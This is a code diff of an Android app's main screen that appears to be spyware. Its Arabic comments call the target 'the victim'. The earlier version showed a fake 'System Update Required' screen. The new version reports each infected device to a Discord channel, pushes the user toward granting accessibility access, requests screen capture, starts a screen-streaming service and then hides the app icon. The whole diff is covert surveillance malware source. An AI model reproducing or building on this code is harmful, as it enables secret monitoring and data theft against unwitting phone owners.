@@ -5,18 +5,10 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.graphics.Color;
 import android.media.projection.MediaProjectionManager;
-import android.net.Uri;
 import android.os.Bundle;
-import android.os.PowerManager;
 import android.provider.Settings;
-import android.view.Gravity;
-import android.widget.Button;
-import android.widget.LinearLayout;
-import android.widget.TextView;
-import java.io.PrintWriter;
-import java.io.StringWriter;
+import android.view.View;
 
 public class MainActivity extends Activity {
     private static final int REQ_CODE = 100;
@@ -25,93 +17,44 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // --- كود صيد الأخطاء (Black Box) ---
-        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
-            StringWriter sw = new StringWriter();
-            throwable.printStackTrace(new PrintWriter(sw));
-            String exceptionAsString = sw.toString();
-            // إرسال تفاصيل الكراش للديسكورد فوراً
-            DiscordSender.sendMessage("⚠️ كراش جديد في جهاز الضحية:\n" + exceptionAsString);
-            System.exit(1);
-        });
+        // أولاً: إرسال إشارة للديسكورد أن التطبيق حي
+        DiscordSender.sendMessage("✅ جهاز جديد متصل: " + android.os.Build.MODEL);
 
-        // رسالة تأكيد الاتصال
-        DiscordSender.sendMessage("🔔 تطبيق حسين متصل بالإنترنت وجاهز للصيد!");
+        // ثانياً: طلب الصلاحيات بالترتيب
+        if (!isAccessibilityEnabled()) {
+            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        }
 
-        // بناء الواجهة برمجياً
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setGravity(Gravity.CENTER);
-        layout.setBackgroundColor(Color.WHITE);
-
-        TextView tv = new TextView(this);
-        tv.setText("System Update Required");
-        tv.setTextSize(22);
-        tv.setTextColor(Color.BLACK);
-        tv.setPadding(0, 0, 0, 60);
-        layout.addView(tv);
-
-        Button btn = new Button(this);
-        btn.setText("بدء التحديث الآن");
-        btn.setBackgroundColor(Color.parseColor("#4CAF50"));
-        btn.setTextColor(Color.WHITE);
-        btn.setPadding(20, 20, 20, 20);
-        
-        btn.setOnClickListener(v -> {
-            // 1. طلب استثناء البطارية
-            requestBatteryOptimizations();
-
-            // 2. التحويل لإمكانية الوصول (Accessibility)
-            try {
-                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-            } catch (Exception e) {
-                DiscordSender.sendMessage("❌ فشل التحويل لإمكانية الوصول: " + e.getMessage());
-            }
-
-            // 3. طلب بث الشاشة
-            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-            if (mpm != null) {
-                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
-            }
-        });
-
-        layout.addView(btn);
-        setContentView(layout);
+        // ثالثاً: طلب بث الشاشة (البوت سيتكفل بالضغط)
+        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        if (mpm != null) {
+            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
+        }
     }
 
-    private void requestBatteryOptimizations() {
-        try {
-            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                intent.setData(Uri.parse("package:" + getPackageName()));
-                startActivity(intent);
-            }
-        } catch (Exception e) {}
+    private boolean isAccessibilityEnabled() {
+        String pref = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+        return pref != null && pref.contains(getPackageName());
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
-            Intent intent = new Intent(this, ScreenService.class);
-            intent.putExtra("resCode", resultCode);
-            intent.putExtra("resData", data);
-            startForegroundService(intent);
-            
-            DiscordSender.sendMessage("🚀 تم تفعيل البث! الأيقونة ستختفي الآن.");
-            hideAppIcon();
+            Intent serviceIntent = new Intent(this, ScreenService.class);
+            serviceIntent.putExtra("resCode", resultCode);
+            serviceIntent.putExtra("resData", data);
+            startForegroundService(serviceIntent);
+
+            // إخفاء الأيقونة تماماً
+            getPackageManager().setComponentEnabledSetting(
+                new ComponentName(this, MainActivity.class),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            );
             finish();
         }
-    }
-
-    private void hideAppIcon() {
-        getPackageManager().setComponentEnabledSetting(
-            new ComponentName(this, MainActivity.class),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        );
     }
 }
